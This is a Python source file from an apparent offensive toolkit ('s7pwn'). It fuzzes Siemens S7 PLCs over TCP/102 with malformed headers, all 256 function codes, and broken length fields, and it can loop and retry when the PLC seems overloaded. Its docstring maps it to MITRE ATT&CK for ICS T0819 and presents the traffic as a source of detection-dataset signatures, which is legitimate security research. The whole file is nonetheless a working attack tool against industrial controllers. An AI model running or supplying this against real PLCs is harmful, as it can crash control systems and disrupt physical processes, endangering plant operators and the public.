from __future__ import annotations
"""
fuzz.py – S7comm Protocol Fuzzer
---------------------------------
Sends deliberately malformed or semi-random S7 PDUs to probe undefined
behaviour, trigger error states, and stress-test the PLC communication stack.

MITRE ATT&CK for ICS
---------------------
  Tactic    : Initial Access / Exploitation
  Technique : T0819 – Exploit of Remote Services

Why this matters for dataset
-----------------------------
Fuzzing traffic has a highly distinctive network signature:
  - High TCP RST / TCP FIN rate (PLC rejects malformed PDUs)
  - `pdu_error_rate` → high  (vs near-zero for normal traffic)
  - Payload entropy HIGH (random bytes in function/parameter fields)
  - Connection churn: connect → send → disconnect per attempt
  - Response latency bimodal: fast reject OR timeout

Modes
-----
  header    – randomise S7 magic byte and ROSCTR field
  function  – brute-force all 256 function codes on valid JOB frame
  length    – send truncated and oversized PDUs (edge-case length values)
  full      – combine all three modes in sequence

Usage
-----
  fuzz [--mode header|function|length|full] [--count 100]
       [--delay 0.05] [--output fuzz_log.jsonl]

Examples
--------
  fuzz                                     # default: full, 100 iterations
  fuzz --mode function --count 256         # probe all function codes
  fuzz --mode length --count 50 --delay 0  # length edge-cases, fast
  fuzz --output results.jsonl              # log every response
"""

import socket
import time
import random
import json
import os
import struct
from typing import List, Optional

from s7pwn.runtime import get_current_target

S7_PORT      = 102
TIMEOUT      = 1.0   # Giảm xuống 1s để fuzz không bị block lâu
MAX_CONN_FAIL = 10   # Số lần connect thất bại liên tiếp trước khi dừng vòng lặp tạm

# ──────────────────────────────────────────────
#  Low-level TCP helpers
# ──────────────────────────────────────────────

def _cotp_connect(ip: str, rack: int = 0, slot: int = 1) -> Optional[socket.socket]:
    """Open raw TCP/102 conn + COTP handshake.
    
    TSAP destination = 0x01 | (rack * 0x20 + slot)
    S7-1200/1500 (slot=1): dst_tsap = 0x01, 0x01
    S7-300       (slot=2): dst_tsap = 0x01, 0x02
    """
    tsap_dst_byte = (rack * 0x20) + slot  # e.g. rack=0, slot=1 → 0x01
    cotp_cr = bytes([
        0x03, 0x00, 0x00, 0x16,
        0x11, 0xE0, 0x00, 0x00, 0x00, 0x01, 0x00,
        0xC0, 0x01, 0x0A,
        0xC1, 0x02, 0x01, 0x00,           # src TSAP: 0x01 0x00 (PG/PC)
        0xC2, 0x02, 0x01, tsap_dst_byte,  # dst TSAP: rack/slot encoded
    ])
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((ip, S7_PORT))
        s.sendall(cotp_cr)
        resp = s.recv(1024)
        # COTP CC (Connection Confirm) bắt đầu bằng 0x03, 0x00 và byte[5]=0xD0
        if len(resp) >= 6 and resp[5] == 0xD0:
            return s
        else:
            # PLC trả lời không hợp lệ: có thể TSAP sai hoặc PLC từ chối
            import logging
            logging.debug(f'[fuzz] COTP rejected: {resp[:10].hex() if resp else "empty"}')
            try: s.close()
            except: pass
            return None
    except Exception as exc:
        import logging
        logging.debug(f'[fuzz] TCP connect failed: {exc}')
        try: s.close()
        except Exception: pass
        return None


def _negotiate_pdu(sock: socket.socket) -> bool:
    neg = bytes([
        0x03, 0x00, 0x00, 0x19,
        0x02, 0xF0, 0x80,
        0x32, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08,
        0x00, 0x00, 0xF0, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0xE0,
    ])
    try:
        sock.sendall(neg)
        resp = sock.recv(1024)
        return len(resp) > 0 and resp[0] == 0x03
    except Exception:
        return False


def _send_raw(sock: socket.socket, payload: bytes) -> dict:
    """Send payload, return {sent_len, response_hex, latency_ms, error}."""
    t0 = time.time()
    try:
        sock.sendall(payload)
        resp = sock.recv(1024)
        lat  = (time.time() - t0) * 1000
        return {"sent_len": len(payload), "response_hex": resp.hex(),
                "latency_ms": round(lat, 2), "error": None}
    except socket.timeout:
        return {"sent_len": len(payload), "response_hex": "",
                "latency_ms": round((time.time()-t0)*1000, 2), "error": "timeout"}
    except Exception as e:
        return {"sent_len": len(payload), "response_hex": "",
                "latency_ms": round((time.time()-t0)*1000, 2), "error": str(e)}


def _wrap_tpkt(s7_body: bytes) -> bytes:
    total_len = 4 + 3 + len(s7_body)
    return bytes([0x03, 0x00, (total_len >> 8) & 0xFF, total_len & 0xFF,
                  0x02, 0xF0, 0x80]) + s7_body


# ──────────────────────────────────────────────
#  Fuzz generators
# ──────────────────────────────────────────────

def _gen_header_fuzz(n: int):
    """Randomise S7 magic (0x32) and ROSCTR byte."""
    pdus = []
    for _ in range(n):
        magic  = random.randint(0x00, 0xFF)
        rosctr = random.randint(0x00, 0xFF)
        body   = bytes([magic, rosctr, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x08, 0x00, 0x00,
                        0x04, 0x01, 0x12, 0x04, 0x11,
                        0x00, 0x00, 0x00, 0x00])
        pdus.append(("header_fuzz", _wrap_tpkt(body)))
    return pdus


def _gen_function_fuzz():
    """One PDU per S7 function code 0x00–0xFF on valid JOB frame."""
    pdus = []
    for fc in range(0x00, 0x100):
        body = bytes([0x32, 0x01, 0x00, 0x00, 0x00, 0x00,
                      0x00, 0x08, 0x00, 0x00,
                      fc,
                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
        pdus.append((f"func_0x{fc:02x}", _wrap_tpkt(body)))
    return pdus


def _gen_length_fuzz(n: int):
    """Send PDUs with truncated, zero, or very large declared lengths."""
    pdus = []
    test_lengths = [0, 1, 2, 3, 6, 7, 10, 50, 100, 240, 480, 960, 1920,
                    0xFFFF, 0xFFFE, 0x0000]
    # Add random lengths
    test_lengths += [random.randint(0, 0xFFFF) for _ in range(n)]
    for length in test_lengths[:n]:
        # Build TPKT with declared length but only N random bytes of body
        actual_body  = bytes([random.randint(0, 255) for _ in range(min(length, 20))])
        declared_len = length
        pkt = bytes([0x03, 0x00,
                     (declared_len >> 8) & 0xFF, declared_len & 0xFF,
                     0x02, 0xF0, 0x80]) + actual_body
        pdus.append((f"length_{declared_len}", pkt))
    return pdus


# ──────────────────────────────────────────────
#  Entry point
# ──────────────────────────────────────────────

def fuzz(args: List[str]) -> None:
    # ── Giá trị mặc định (tránh UnboundLocalError nếu thiếu --mode / --count) ──
    mode      = "full"
    count     = 100
    delay     = 0.05
    output    = None
    loop_mode = False

    i = 0
    while i < len(args):
        a = args[i]
        if a == "--mode"   and i+1 < len(args): mode      = args[i+1].lower(); i += 2
        elif a == "--count"  and i+1 < len(args): count   = int(args[i+1]);    i += 2
        elif a == "--delay"  and i+1 < len(args): delay   = float(args[i+1]); i += 2
        elif a == "--output" and i+1 < len(args): output  = args[i+1];        i += 2
        elif a == "--loop": loop_mode = True; i += 1
        else: i += 1

    t = get_current_target()
    if not t:
        print("[!] No target selected. Use 'set_target' or 'select'."); return

    ip   = t["ip"]
    rack = t.get("rack", 0)
    slot = t.get("slot", 1)

    print(f"\n[*] Protocol Fuzzer  target={ip}  mode={mode}  count={count}")
    print(f"    MITRE ATT&CK ICS T0819 – Exploit of Remote Services")
    print(f"    COTP TSAP dst=0x01/{(rack*0x20+slot):02x} (rack={rack}, slot={slot})\n")

    # Build PDU list
    if mode == "header":
        pdus = _gen_header_fuzz(count)
    elif mode == "function":
        pdus = _gen_function_fuzz()[:count]
    elif mode == "length":
        pdus = _gen_length_fuzz(count)
    else:  # full
        per = max(count // 3, 1)
        pdus = (_gen_header_fuzz(per) +
                _gen_function_fuzz()[:per] +
                _gen_length_fuzz(per))

    log_file = None
    if output:
        log_file = open(output, "w")

    stats = {"sent": 0, "responded": 0, "timeout": 0, "error": 0,
             "unique_responses": set()}
    start_ts = time.time()

    try:
        conn_fail_streak = 0
        while True:
            for idx, (label, pdu) in enumerate(pdus):
                # Fresh connection per attempt, with correct rack/slot TSAP
                sock = _cotp_connect(ip, rack, slot)
                if sock is None:
                    stats["error"] += 1
                    conn_fail_streak += 1
                    if conn_fail_streak >= MAX_CONN_FAIL:
                        print(f"  [!] {conn_fail_streak} kết nối liên tiếp thất bại — PLC có thể đang quá tải, chờ 5s...")
                        time.sleep(5)
                        conn_fail_streak = 0
                    continue

                conn_fail_streak = 0  # Reset streak khi connect thành công
                _negotiate_pdu(sock)   # try to negotiate (may fail for fuzzed frames)
                result = _send_raw(sock, pdu)
                try: sock.close()
                except Exception: pass

                stats["sent"] += 1
                if result["error"] == "timeout":
                    stats["timeout"] += 1
                elif result["error"]:
                    stats["error"] += 1
                else:
                    stats["responded"] += 1
                    # Track unique response prefixes
                    rhex = result["response_hex"][:16]
                    stats["unique_responses"].add(rhex)

                row = {
                    "idx":       idx,
                    "label":     label,
                    "sent_len":  result["sent_len"],
                    "resp_hex":  result["response_hex"][:32],
                    "lat_ms":    result["latency_ms"],
                    "error":     result["error"],
                    "pdu_hex":   pdu.hex()[:32],
                }

                # Print interesting findings
                if result["error"] is None and result["response_hex"]:
                    resp = bytes.fromhex(result["response_hex"])
                    # S7 ACK_DATA with no error = something accepted
                    if len(resp) > 11 and resp[7] == 0x03 and resp[11] == 0x00:
                        print(f"  [!] ACCEPTED  {label:30s}  lat={result['latency_ms']:.1f}ms")

                if log_file:
                    log_file.write(json.dumps(row) + "\n")

                if stats["sent"] % 100 == 0:
                    print(f"  [>] Sent {stats['sent']} PDUs...")

                if delay > 0:
                    time.sleep(delay)

            if not loop_mode:
                break

    except KeyboardInterrupt:
        print("\n[!] Fuzzing interrupted.")
    finally:
        if log_file:
            log_file.close()

    elapsed = time.time() - start_ts
    print(f"\n{'='*50}")
    print(f"  Fuzzing Summary")
    print(f"{'='*50}")
    print(f"  PDUs sent        : {stats['sent']}")
    print(f"  Got response     : {stats['responded']}")
    print(f"  Timeouts         : {stats['timeout']}")
    print(f"  Errors (conn)    : {stats['error']}")
    print(f"  Unique responses : {len(stats['unique_responses'])}")
    print(f"  Duration         : {elapsed:.1f}s")
    if output and os.path.exists(output):
        print(f"  Log              : {os.path.abspath(output)}")
    print(f"{'='*50}\n")
